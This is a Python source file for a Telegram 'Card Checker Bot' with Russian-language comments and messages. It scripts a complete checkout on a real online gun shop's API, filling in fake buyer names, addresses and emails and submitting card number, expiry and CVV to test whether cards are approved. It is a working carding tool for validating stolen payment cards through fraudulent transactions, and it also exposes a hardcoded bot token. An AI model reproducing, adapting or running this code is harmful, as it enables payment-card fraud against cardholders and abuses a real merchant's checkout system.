import asyncio
import httpx
import json
import re
import random
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from faker import Faker
import threading
import time

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8649620042:AAFEM_3AZdIM3Ycy_Qiyl1k21sgnBsvGoyo"
ADMIN_ID = 5820488467
# =====================================================

bot = telebot.TeleBot(BOT_TOKEN)
fake = Faker('en_US')

# Хранилище для ожидающих чекеров
pending_checks = {}


async def gencaptcha():
    charset = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz123456789"
    captcha = ''.join(random.choice(charset) for _ in range(6))
    return captcha


async def check_card(card_data):
    """Асинхронная проверка карты"""
    cardinput = card_data["card_input"]
    user_id = card_data["user_id"]
    
    try:
        separador = '|' if '|' in cardinput else '/'
        parts = cardinput.split(separador)
        cc = parts[0].strip()
        mm_raw = parts[1].strip()
        yy_raw = parts[2].strip()
        cvv = parts[3].strip()
        mm = mm_raw.zfill(2)
        yy = yy_raw if len(yy_raw) == 4 else f"20{yy_raw}"
    except:
        await bot.send_message(user_id, "❌ Неверный формат. Используйте: номер|месяц|год|cvv")
        return
    
    # Генерация фейковых данных
    firstname = fake.first_name()
    lastname = fake.last_name()
    fullname = f"{firstname} {lastname}"
    phonenumber = f"205{''.join([str(random.randint(0, 9)) for _ in range(7)])}"
    phoneformatted = f"({phonenumber[:3]}) {phonenumber[3:6]}-{phonenumber[6:]}"
    email = f"{firstname.lower()}{random.randint(100, 999)}{lastname.lower()}@gmail.com"
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zipcode = fake.zipcode()
    
    async with httpx.AsyncClient(proxy=None, verify=False, timeout=15.0) as client:
        try:
            # request 1
            header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            req = await client.get(url="https://gunshoplasvegas.com/group/accessories", headers=header)
            
            # request 2
            header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/group/accessories', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            params = {'action': 'add_to_cart'}
            data = '{"product_id":"1837395","quantity":1,"shopping_cart_id":"","source":"FRONTEND","hostname":"gunshoplasvegas.com","app_route":"/group/accessories"}'
            req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
            
            cart_match = re.search(r'"shopping_cart_id":\s*"(\d+)"', req.text)
            if not cart_match:
                await bot.send_message(user_id, "❌ Ошибка: не удалось получить cart_id")
                return
            cartid = cart_match.group(1)
            
            # request 3
            header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/delivery', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            params = {'action': 'save_billing'}
            data = f'{{"display_name":"","waiver_on_file":false,"first_name":"{firstname}","last_name":"{lastname}","phone_number":"{phonenumber}","email_address":"{email}","notes":"","source":"CHECKOUT","fd_token":null,"shopping_cart_id":"{cartid}","section":"delivery","hostname":"gunshoplasvegas.com","contact_id":6399176}}'
            req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
            response = json.loads(req.text)
            clientid = response.get('client_id')
            
            # request 4
            header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/payment', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            params = {'action': 'save_billing'}
            data = f'{{"contact_id":6399176,"client_id":{clientid},"first_name":"{firstname}","middle_name":"","last_name":"{lastname}","suffix":"","company_name":"","address_1":"{address}","address_2":"","city":"{city}","state":"{state}","zip_code":"{zipcode}","country_code":"US","latitude":"","longitude":"","email_address":"{email}","phone_number":"{phoneformatted}","phone_number_type_id":1,"birthdate":"","source_id":"","notes":"","last_update":"2025-12-28 10:11:35","inactive":0,"version":1,"membership_id":"","membership_number":"","end_date":"","membership_inactive":"","primary_contact_membership_id":"","subscription_id":"","payment_on_file":0,"drivers_license_number":"","display_name":"{fullname}","waiver_on_file":false,"fd_token":null,"shopping_cart_id":"{cartid}","section":"payment","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
            req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
            
            captcha = await gencaptcha()
            client.cookies.set("checkout_id", captcha, domain="gunshoplasvegas.com", path="/")
            
            # request 5
            header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/review', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            params = {'action': 'get_shopping_cart'}
            data = f'{{"include_images":true,"using_financing":null,"fd_token":null,"shopping_cart_id":"{cartid}","section":"review","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
            req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
            response = json.loads(req.text)
            amount = response.get('totals', {}).get('balance_remaining', '0.00')
            
            # request 6 - оплата
            header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/review', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
            params = {'action': 'process_credit_card'}
            data = f'{{"number":"{cc}","cardholder_name":"{fullname}","month":"{mm}","year":{yy},"cvv":"{cvv}","simulate":"","checkout_id":"{captcha}","fd_token":null,"shopping_cart_id":"{cartid}","section":"review","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
            req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
            response = json.loads(req.text)
            
            status = "✅ APPROVED" if response.get('status') in ['success', 'true'] else "❌ DECLINED"
            message = response.get('message', '')
            gateway = response.get('gateway', 'unknown')
            
            result_text = f"""
💳 <b>CARD CHECK RESULT</b>
{'-'*35}
🔢 <b>Card:</b> <code>{cc}|{mm_raw}|{yy_raw}|{cvv}</code>
💰 <b>Amount:</b> ${amount}
📊 <b>Status:</b> {status}
🏦 <b>Gateway:</b> {gateway}
📝 <b>Message:</b> {message if message else 'Processed'}
{'-'*35}
"""
            await bot.send_message(user_id, result_text, parse_mode="HTML")
            
        except Exception as e:
            await bot.send_message(user_id, f"❌ Ошибка: {str(e)[:100]}")


def run_async_check(card_data):
    """Запускает асинхронную проверку в отдельном потоке"""
    asyncio.run(check_card(card_data))


# ==================== TELEGRAM HANDLERS ====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "⛔ Доступ запрещен. Только для администратора.")
        return
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("💳 Проверить карту", callback_data="check_card"),
        InlineKeyboardButton("ℹ️ Инфо", callback_data="info")
    )
    
    bot.send_message(
        user_id,
        "🔐 <b>Card Checker Bot</b>\n\n"
        "Бот для проверки кредитных карт через GunShopLasVegas\n\n"
        "Используйте формат: <code>номер|месяц|год|cvv</code>\n"
        "Пример: <code>414720|12|26|123</code>",
        parse_mode="HTML",
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data == "check_card")
def check_card_callback(call):
    user_id = call.from_user.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Нет доступа")
        return
    
    msg = bot.send_message(
        user_id,
        "💳 Введите данные карты в формате:\n<code>номер|месяц|год|cvv</code>\n\n"
        "Пример: <code>414720|12|26|123</code>",
        parse_mode="HTML"
    )
    
    bot.register_next_step_handler(msg, process_card_input)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "info")
def info_callback(call):
    user_id = call.from_user.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Нет доступа")
        return
    
    info_text = """
📌 <b>Информация о боте</b>

✅ Проверяет карты через GunShopLasVegas
💰 Сумма чека: ~$25-50
🔐 Работает с VISA, Mastercard, AMEX

<b>Формат ввода:</b>
<code>номер|месяц|год|cvv</code>

<b>Пример:</b>
<code>414720|12|26|123</code>

Результат покажет статус:
• ✅ APPROVED - карта валидна
• ❌ DECLINED - карта не прошла
"""
    bot.send_message(user_id, info_text, parse_mode="HTML")
    bot.answer_callback_query(call.id)


def process_card_input(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        return
    
    card_input = message.text.strip()
    
    # Простая проверка формата
    if '|' not in card_input and '/' not in card_input:
        bot.send_message(user_id, "❌ Неверный формат. Используйте: номер|месяц|год|cvv")
        return
    
    # Отправляем сообщение о начале проверки
    msg = bot.send_message(user_id, "🔄 Проверяю карту... Это может занять 10-30 секунд")
    
    # Запускаем проверку в отдельном потоке
    card_data = {
        "card_input": card_input,
        "user_id": user_id
    }
    
    thread = threading.Thread(target=run_async_check, args=(card_data,))
    thread.daemon = True
    thread.start()
    
    # Удаляем сообщение "Проверяю..." через 2 секунды
    time.sleep(2)
    bot.delete_message(user_id, msg.message_id)


@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        return
    
    help_text = """
<b>📖 Команды бота:</b>

/start - Главное меню
/help - Эта справка

<b>💳 Проверка карты:</b>
Нажмите кнопку "Проверить карту" или отправьте данные в формате:
<code>номер|месяц|год|cvv</code>

<b>Пример:</b>
<code>414720|12|26|123</code>
"""
    bot.send_message(user_id, help_text, parse_mode="HTML")


# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 CARD CHECKER BOT")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 50)
    print("Bot started...")
    
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
